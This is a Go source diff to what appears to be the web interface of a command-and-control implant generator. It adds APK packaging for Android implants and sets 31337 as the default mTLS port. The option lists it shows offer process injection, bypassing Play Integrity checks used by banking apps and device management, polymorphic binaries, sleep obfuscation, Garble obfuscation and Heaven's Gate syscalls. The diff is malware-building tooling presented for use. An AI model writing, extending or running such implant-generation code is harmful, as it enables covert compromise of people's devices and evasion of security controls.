@@ -305,11 +305,12 @@ func buildGenerateOptions(os, arch string) generateOptions {
 			OS: os, Arch: arch,
 			Arches: []string{"arm64", "arm", "amd64"},
 			Formats: []optionItem{
-				// NOTE: 'exe' produces a raw ELF binary for Android (GOOS=android).
-				// APK packaging is a separate step: run 'make android-apk' after generate.
-				// The server-side generate pipeline does not support apk as a direct format.
-				{Value: "exe",    Label: "ELF Binary", Description: "Raw ARM64 ELF — deploy via ADB or shell (recommended)"},
-				{Value: "shared", Label: "Shared .so",  Description: "Shared library — inject into existing Android process"},
+				// 'exe' produces a raw ELF binary (GOOS=android).
+			// 'apk' is a two-step process: server generates ELF, then 'make android-apk' packages it.
+			// 'shared' produces a .so for process injection.
+			{Value: "exe",    Label: "ELF Binary", Description: "Raw ELF — deploy via ADB or shell (recommended)"},
+			{Value: "apk",    Label: "APK Package", Description: "Android APK — Step 1: generate ELF, Step 2: make android-apk"},
+			{Value: "shared", Label: "Shared .so",  Description: "Shared library — inject into existing Android process"},
 			},
 			Protocols: []optionItem{
 				{Value: "mtls",       Label: "mTLS",          Description: "Mutual TLS — high stealth"},
@@ -329,7 +330,7 @@ func buildGenerateOptions(os, arch string) generateOptions {
 				{Key: "polymorphic",    Label: "Polymorphic",     Description: "Unique binary per target",                        Default: false},
 				{Key: "play_integrity", Label: "Play Integrity",  Description: "Bypass banking/Netflix/MDM checks",              Default: false},
 			},
-			DefaultPort: map[string]int{"mtls": 8888, "https": 443, "http": 80, "dns": 53},
+			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53},
 		}
 
 	case "linux":
@@ -351,7 +352,7 @@ func buildGenerateOptions(os, arch string) generateOptions {
 				{Key: "evasion",   Label: "Evasion",   Description: "Sleep obfuscation, basic stealth",    Default: true},
 				{Key: "obfuscate", Label: "Obfuscate", Description: "Garble source obfuscation",          Default: false},
 			},
-			DefaultPort: map[string]int{"mtls": 8888, "https": 443, "http": 80, "dns": 53, "wg": 51820},
+			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53, "wg": 51820},
 		}
 
 	case "macos":
@@ -373,7 +374,7 @@ func buildGenerateOptions(os, arch string) generateOptions {
 				{Key: "evasion",   Label: "Evasion",   Description: "Sleep obfuscation, basic stealth", Default: true},
 				{Key: "obfuscate", Label: "Obfuscate", Description: "Garble source obfuscation",        Default: false},
 			},
-			DefaultPort: map[string]int{"mtls": 8888, "https": 443, "http": 80, "dns": 53, "wg": 51820},
+			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53, "wg": 51820},
 		}
 
 	default: // windows
@@ -408,7 +409,7 @@ func buildGenerateOptions(os, arch string) generateOptions {
 				{Key: "heavens_gate",Label: "Heaven's Gate",   Description: "32-bit syscalls in 64-bit process",          Default: false},
 				{Key: "obfuscate",   Label: "Obfuscate",       Description: "Garble source obfuscation",                  Default: false},
 			},
-			DefaultPort: map[string]int{"mtls": 8888, "https": 443, "http": 80, "dns": 53, "wg": 51820, "smb": 445},
+			DefaultPort: map[string]int{"mtls": 31337, "https": 443, "http": 80, "dns": 53, "wg": 51820, "smb": 445},
 		}
 	}
 }
@@ -452,22 +453,28 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 	// Build the equivalent console command for reference
 	cmd := buildGenerateCommand(req)
 
-	_ = json.NewEncoder(w).Encode(generateResp{
-		Command: cmd,
-		Message: fmt.Sprintf(
-			"Implant configured: %s/%s via %s to %s:%d. "+
-				"Run the command in the server console to generate the binary.",
-			req.OS, req.Arch, req.Protocol, req.C2Host, req.C2Port,
-		),
-	})
+	msg := fmt.Sprintf(
+		"Implant configured: %s/%s via %s to %s:%d. "+
+			"Run the command in the server console to generate the binary.",
+		req.OS, req.Arch, req.Protocol, req.C2Host, req.C2Port,
+	)
+	if req.Format == "apk" {
+		msg += " Then run 'make android-apk' in the project root to package the ELF as an APK."
+	}
+	_ = json.NewEncoder(w).Encode(generateResp{Command: cmd, Message: msg})
 }
 
 func buildGenerateCommand(req generateReq) string {
 	parts := []string{fmt.Sprintf("generate --%s %s:%d", req.Protocol, req.C2Host, req.C2Port)}
 	parts = append(parts, "--os "+req.OS)
 	parts = append(parts, "--arch "+req.Arch)
-	if req.Format != "" && req.Format != "exe" {
-		parts = append(parts, "--format "+req.Format)
+	// APK is a post-generate packaging step; the server generates an ELF binary.
+	genFormat := req.Format
+	if genFormat == "apk" {
+		genFormat = "exe"
+	}
+	if genFormat != "" && genFormat != "exe" {
+		parts = append(parts, "--format "+genFormat)
 	}
 	// Add active evasion flags
 	evasionFlags := map[string]string{
